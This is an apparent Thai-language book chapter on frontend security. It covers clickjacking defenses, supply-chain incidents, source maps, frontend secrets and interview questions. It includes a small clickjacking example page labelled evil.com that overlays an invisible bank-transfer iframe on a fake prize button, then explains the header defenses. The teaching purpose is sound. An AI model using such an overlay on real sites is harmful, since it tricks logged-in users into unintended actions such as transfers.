**Clickjacking (UI redressing)**: ผู้โจมตีโหลด**เว็บจริงของเรา**ใส่ `<iframe>` แล้วตั้ง `opacity: 0` วางทับ UI หลอกบนหน้าของมัน — เหยื่อคิดว่ากดปุ่ม "รับรางวัล!" จริง ๆ นิ้วไปโดนปุ่ม "โอนเงิน" ของเราที่ล่องหนอยู่ข้างบน และเพราะเหยื่อ login ไว้ การกระทำนั้นก็เกิดจริงในนามเขา:

```html
<!-- หน้า evil.com -->
<div style="position:relative">
  <button>🎁 กดรับรางวัลฟรี!</button>                    <!-- เหยื่อเห็นและตั้งใจกดอันนี้ -->
  <iframe src="https://bank.com/transfer?to=attacker"     <!-- เว็บจริง โปร่งใส ทับข้างบน -->
          style="position:absolute; inset:0; opacity:0"></iframe>
</div>
```

เงื่อนไขที่ทำให้โจมตีได้: (1) เว็บเป้าหมาย**ยอมให้ฝังใน iframe** และ (2) เหยื่อ login ค้างไว้ — ต่างจาก XSS ตรงที่ไม่ต้องฉีด script อะไรเลย แค่ยืม "การคลิกของเหยื่อ" ไปกดของจริง

**แก้ที่ราก — บอก browser ว่า "ห้ามเอาหน้านี้ไปฝัง frame ของคนอื่น"** ผ่าน 2 header (ใส่คู่กัน):

```http
Content-Security-Policy: frame-ancestors 'none'    ← ตัวหลัก (CSP Level 2+, ยืดหยุ่นกว่า)
X-Frame-Options: DENY                                ← ตัวเก่า ไว้ fallback browser เก่า
```

ค่าที่เลือกตาม use case:

| ต้องการ | frame-ancestors | X-Frame-Options |
|---|---|---|
| ห้ามใครก็ตาม frame | `'none'` | `DENY` |
| เฉพาะตัวเอง (same-origin) | `'self'` | `SAMEORIGIN` |
| ตัวเอง + subdomain / partner | `'self' https://*.example.com` | ทำไม่ได้ |

**กับดักสำคัญ — `'self'` = same-ORIGIN ไม่ใช่ same-SITE:** ถ้าเว็บอยู่ที่ `app.example.com` ตั้ง `frame-ancestors 'self'` แล้ว `www.example.com` จะ frame ไม่ได้ (same-site แต่คนละ origin) ถ้าอยากให้ subdomain ในเครือ frame ได้ต้อง**ระบุเอง** `'self' https://*.example.com` เพราะ CSP ไม่มีคีย์เวิร์ด "same-site" ให้ตรง ๆ — จุดนี้แหละที่ `frame-ancestors` เหนือ `X-Frame-Options` ชัด (XFO ทำได้แค่ DENY/SAMEORIGIN ระบุ origin เพิ่มหรือ wildcard ไม่ได้เลย)

**จุดที่คนพลาด 2 อย่าง:**
- **ต้องเป็น response header ของทุก HTML document ไม่ใช่แค่ `index.html`** — ทุก route ที่ browser render เป็น "หน้า" ต้องมี ตั้งเป็น **global ที่ชั้น proxy/middleware** (nginx `add_header ... always`, Caddy `header`, Express `helmet`, Spring `frameOptions().deny()`) จะครอบทุก response ไม่มี route หลุด
- **ตั้งใน `<meta>` tag ไม่ได้ผล** — `frame-ancestors`/`X-Frame-Options` ต้องมาจาก HTTP header จริงเท่านั้น เพราะ browser ต้องรู้ว่า "ห้าม frame" **ก่อน**เริ่ม render

**ชั้นรองที่ได้ฟรี:** `SameSite=Lax` ช่วยด้วย — iframe = cross-site subresource cookie จึงไม่ถูกแนบ หน้าที่โผล่ในกรอบเลย**ไม่ได้ login** การคลิกไม่มีสิทธิ์ทำอะไร แต่**อย่าพึ่งชั้นเดียว** — `frame-ancestors` คือด่านหลักที่ต้องมี

> **อย่าสับสนกับ network-level attack:** อาการ "ต่อ wifi สาธารณะแล้วคลิกอะไรก็เด้งไปเว็บโฆษณา" **ไม่ใช่** clickjacking — นั่นคือ ISP/router แทรก redirect ใส่หน้า **http ที่ไม่เข้ารหัส** (MITM) กันคนละทาง: clickjacking กันที่ header ของเว็บ ส่วน network injection กันด้วย **HTTPS + HSTS** (เว็บบังคับ https เสมอ ปิดช่อง downgrade) — คนละชั้นของปัญหา

## Supply Chain — โค้ดคนอื่นในบ้านเรา

แอป frontend ทั่วไปมี dependency (รวม transitive) หลักร้อยถึงพัน — ทุกตัวรันด้วยสิทธิ์เต็มทั้งใน build และใน browser การ `npm install` หนึ่งครั้งคือ**การเชิญคนแปลกหน้าพันคนเข้าบ้านพร้อมกุญแจสำรอง** เหตุการณ์จริงที่ senior ควรเล่าได้:

| เหตุการณ์ | ปี | รูปแบบการโจมตี |
|---|---|---|
| `event-stream` | 2018 | maintainer เหนื่อยแล้วมอบสิทธิ์ให้อาสาสมัครแปลกหน้า → แอบฝังโค้ดขโมย bitcoin wallet ใน dependency ย่อย |
| `ua-parser-js`, `node-ipc` | 2021–2022 | บัญชี maintainer โดน hijack / maintainer ฝัง payload เอง (protestware) |
| Typosquatting (`lodahs`, `crossenv`) | เรื้อรัง | ตั้งชื่อ package เลียนของดัง รอคนพิมพ์ผิดหนึ่งตัวอักษร |
| `polyfill.io` | 2024 | โดเมน CDN ถูกขายเปลี่ยนมือ แล้วเสิร์ฟ script มุ่งร้ายใส่เว็บนับแสนที่ฝัง tag ไว้ |

การป้องกันขั้นพื้นฐานที่ต้องมี (โยงเล่ม backend บท 20 — เป็นวินัยเดียวกัน):

- **Lockfile** commit เสมอ + CI ใช้ `npm ci` (ติดตั้งตาม lock เป๊ะ) — กันเวอร์ชันไหลเอง
- `npm audit` ใน CI — แต่เข้าใจ nuance: เสียงเตือนส่วนใหญ่คือ devDependencies ที่ไม่ถึง production, จัดลำดับตาม reachability ไม่ใช่ตามจำนวน
- **Dependabot/Renovate** — อัปเดตเป็น PR เล็กสม่ำเสมอ (ปล่อยค้างปีแล้วอัปทีเดียว = เจ็บกว่า) แต่*อย่า auto-merge major ทันทีที่ออก* — มัลแวร์มักอยู่ในเวอร์ชันที่เพิ่งถูก hijack การรอสองสามวันคือ filter ฟรี
- Third-party `<script>` บนหน้า: ใช้ **SRI (Subresource Integrity — attribute `integrity` ที่ให้ browser ตรวจ hash ของไฟล์)** เมื่อ pin เวอร์ชันได้ และตัดสินใจอย่างมีสติว่า tag ตัวไหน*คุ้มความเสี่ยง*ที่จะอยู่บนหน้า checkout

## Source Map บน Production

Source map ทำให้ stack trace ใน error tracker อ่านออก (บท 13 พูดเรื่อง debug prod) แต่ serve public = แจกซอร์สโค้ดพร้อม comment ให้โลก คำตอบ nuance ที่ senior ควรให้: **สร้าง source map ตอน build → upload ให้ error tracker (Sentry ฯลฯ) → ไม่ deploy ขึ้น public server** ได้ทั้ง stack trace อ่านออกและไม่เปิดเผยโค้ด — และย้ำหลักถัดไปทันที: ต่อให้ไม่มี source map โค้ดก็แค่*อ่านยากขึ้น* ไม่ใช่*ลับ* — การซ่อนโค้ดไม่ใช่กลไก security (security through obscurity)

## Secret ใน Frontend — ไม่มีอยู่จริง

`VITE_API_KEY=...` แล้วใช้ใน client code = key นั้น**อยู่ใน bundle ที่ทุกคน view-source ได้** ไม่ว่าจะ minify กี่ชั้น — คำว่า environment variable ฝั่ง FE คือ "config ตอน build" ไม่ใช่ "ความลับ" กติกาเด็ดขาด: **ไม่มีคำว่า secret ใน bundle** — key ที่มีสิทธิ์จริง (payment, DB, LLM API) ต้องอยู่หลัง **BFF/proxy**: browser เรียก endpoint ของเรา → server ของเราแนบ key แล้วเรียกต่อ พร้อมทำ rate limit และ authorize ได้ด้วย ส่วน key ที่ออกแบบมาให้ public อยู่แล้ว (Google Maps browser key, Firebase config) ไม่ใช่ secret — ความปลอดภัยของมันอยู่ที่ referrer restriction และ security rules ฝั่งบริการ

## คำถามสัมภาษณ์ที่ต้องตอบได้

1. **ผู้ใช้เปิด DevTools แก้ role เป็น admin ได้ — ป้องกันยังไง?**
   → ป้องกันไม่ได้และไม่ต้อง: browser เป็นเครื่องของผู้ใช้ การซ่อนปุ่มคือ UX ไม่ใช่ security — server ต้อง authorize ทุก request จาก session/token ที่ verify เอง ไม่เชื่อ field ใดๆ จาก client แก้ FE ได้แค่หน้าจอตัวเอง แต่ต้องผ่านด่าน server เสมอ

2. **React escape ให้อยู่แล้ว — แปลว่าไม่ต้องกังวล XSS?**
   → ไม่: auto-escape ปิดเคส interpolation ปกติ แต่ช่องที่เหลือคือ dangerouslySetInnerHTML/bypassSecurityTrust กับข้อมูลที่ไม่ผ่าน DOMPurify, `href` ที่เป็น `javascript:`, และ third-party script ที่รันด้วยสิทธิ์เต็มของหน้า — บวก CSP (nonce + strict-dynamic) เป็นตาข่ายชั้นสุดท้ายเมื่อชั้นแรกหลุด

3. **CSRF เกิดได้ยังไง แล้วทำไม token ใน header ไม่โดน**
   → เพราะ browser แนบ cookie ให้อัตโนมัติทุก request ที่วิ่งไปหา origin นั้น ไม่ว่าใครสั่งยิง — evil.com หลอกให้ browser ยิง POST พร้อม cookie จริงได้ แต่ header ต้องให้ JS แนบเอง และ JS ข้าม origin อ่าน token เราไม่ได้ ป้องกันด้วย SameSite=Lax/Strict อย่างชัดเจน + CSRF token สำหรับ mutation สำคัญ

4. **เก็บ token ที่ localStorage หรือ cookie ดี?**
   → localStorage โดน XSS อ่านได้ตรงๆ / httpOnly cookie ทำให้ JS อ่านไม่ได้ (ลดการขโมย token) แต่แลกกับต้องกัน CSRF — คำแนะนำผม: httpOnly + Secure + SameSite + CSRF protection หรือถ้าออกแบบใหม่ได้ใช้ BFF ให้ token จริงไม่ลงมาที่ browser เลย และย้ำว่า httpOnly ไม่ได้กัน XSS ยิง request ในนามผู้ใช้ — มันลดแค่ blast radius

5. **CSP ช่วยอะไร ในเมื่อเรากัน XSS อยู่แล้ว**
   → มันคือ defense in depth: วันที่ sanitize พลาดสักจุด CSP ทำให้ script ที่ฉีดเข้ามาไม่ถูกรันเพราะไม่มี nonce — แนวปัจจุบันคือ nonce + strict-dynamic แทน whitelist โดเมน, เริ่มด้วย Report-Only ก่อนเปิดจริง, และเสริม Trusted Types เพื่อปิด DOM sink เชิงโครงสร้าง

6. **ถ้าต้องใช้ API key ของบริการภายนอกใน frontend ทำยังไง**
   → ตั้งคำถามก่อนว่า key นั้น public-by-design ไหม — ถ้าใช่ (Maps, Firebase) ใช้ได้แต่ต้องล็อก restriction ฝั่งบริการ ถ้าเป็น key ที่มีสิทธิ์จริง ห้ามอยู่ใน bundle เด็ดขาด เพราะทุกอย่างใน bundle คือ public — ให้เรียกผ่าน BFF/proxy ที่ server แนบ key เอง พร้อมได้ rate limit และ audit ฟรี

7. **เก็บ token ที่ไหนใน mobile (React Native / Flutter)**
   → hardware-backed secure storage: Keychain (iOS) / Keystore หรือ EncryptedSharedPreferences (Android) ไม่ใช่ AsyncStorage/SharedPreferences ธรรมดาที่ไม่เข้ารหัสและหลุดผ่าน backup — refresh token ใน secure storage (gate biometric ได้), access token อายุสั้นถือใน memory, แนบเป็น Bearer header ซึ่งตัด CSRF ในตัว และย้ำว่า httpOnly ไม่ใช่ default บน native เพราะไม่มี XSS/DOM ให้มันกัน — secure storage แค่ยกต้นทุน ต้องเสริม rotation + short TTL + attestation

8. **token/session id ถูกขโมยแล้วยังใช้ได้ — แก้เชิงโครงสร้างยังไง**
   → bearer มีจุดตายว่า "ถือ = ใช้ได้" — ทางแก้รากคือ Proof-of-Possession (DPoP/mTLS): สร้าง key pair ใน Secure Enclave/Keystore (private key export ไม่ได้), ผูก session กับ public key, ทุก request เซ็นด้วย private key ให้ server verify ขโมย token ไปเซ็นไม่ได้ก็ใช้ไม่ได้ — และห้ามผูก/encrypt ด้วย deviceId เพราะเป็น id ที่ copy ได้ ไม่ใช่ secret (รายละเอียด BFF + session lifecycle อยู่บท 17)

## สรุปท้ายบท

- frontend security เริ่มจากการยอมรับว่าฝั่ง client ไม่ใช่ security boundary
- งานของ frontend คือช่วยลดพื้นผิวการโจมตี, ไม่เปิดช่อง XSS/CSRF/secret leak และไม่สร้างภาพลวงว่าการซ่อน UI เท่ากับการป้องกันสิทธิ์
- หลักคิดเรื่อง boundary ที่ถูกต้องช่วยให้ตัดสินใจเรื่อง token, CSP, sanitization และ third-party script ได้แม่นขึ้น
- security ที่ดีใน frontend จึงเป็นการร่วมมือกับ backend ไม่ใช่การพยายามแบกงานของ backend มาไว้ใน browser

## ก่อนไปบทถัดไป

เมื่อเก็บทั้งเรื่อง performance, accessibility, testing และ security แล้ว บทถัดไปจะพาไปใช้ของทั้งหมดในระดับ system design และ production decision ซึ่งเป็นสนามที่แนวคิดเหล่านี้ต้องมาชนกันจริง
